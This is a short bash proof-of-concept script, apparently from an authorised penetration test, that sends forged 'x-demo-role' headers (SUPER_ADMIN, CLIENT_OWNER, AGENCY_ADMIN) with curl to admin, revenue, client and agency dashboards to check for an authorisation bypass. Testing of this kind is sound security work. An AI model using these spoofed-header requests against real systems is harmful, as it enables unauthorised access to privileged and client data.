#!/bin/bash
# Demo Header Bypass Payload — T1548.002 (PoC only)
# ROE: Fork/canary — proof not destruction

TARGET="${1:-http://localhost:3000}"

echo "=== Phase 2b: Demo Header Bypass ==="
echo "Target: $TARGET"
echo ""

# Test 1: Admin dashboard with SUPER_ADMIN demo headers
echo "--- Test 1: SUPER_ADMIN bypass ---"
curl -s -o /dev/null -w "HTTP %{http_code} | Size: %{size_download}b" \
  -H 'x-demo-user-id: user_qa' \
  -H 'x-demo-organization-id: org_qa' \
  -H 'x-demo-role: SUPER_ADMIN' \
  "$TARGET/admin/dashboard"
echo ""

# Test 2: Admin revenue dashboard
echo "--- Test 2: Revenue data access ---"
curl -s -o /dev/null -w "HTTP %{http_code} | Size: %{size_download}b" \
  -H 'x-demo-user-id: user_qa' \
  -H 'x-demo-organization-id: org_qa' \
  -H 'x-demo-role: SUPER_ADMIN' \
  "$TARGET/admin/revenue"
echo ""

# Test 3: Client data access
echo "--- Test 3: Client data (CLIENT_OWNER) ---"
curl -s -o /dev/null -w "HTTP %{http_code} | Size: %{size_download}b" \
  -H 'x-demo-user-id: user_client_qa' \
  -H 'x-demo-organization-id: org_qa' \
  -H 'x-demo-role: CLIENT_OWNER' \
  -H 'x-demo-client-id: client_qa' \
  "$TARGET/client/dashboard"
echo ""

# Test 4: Agency admin access
echo "--- Test 4: Agency admin (AGENCY_ADMIN) ---"
curl -s -o /dev/null -w "HTTP %{http_code} | Size: %{size_download}b" \
  -H 'x-demo-user-id: user_agency_qa' \
  -H 'x-demo-organization-id: org_qa' \
  -H 'x-demo-role: AGENCY_ADMIN' \
  -H 'x-demo-agency-scope: true' \
  "$TARGET/agency/dashboard"
echo ""
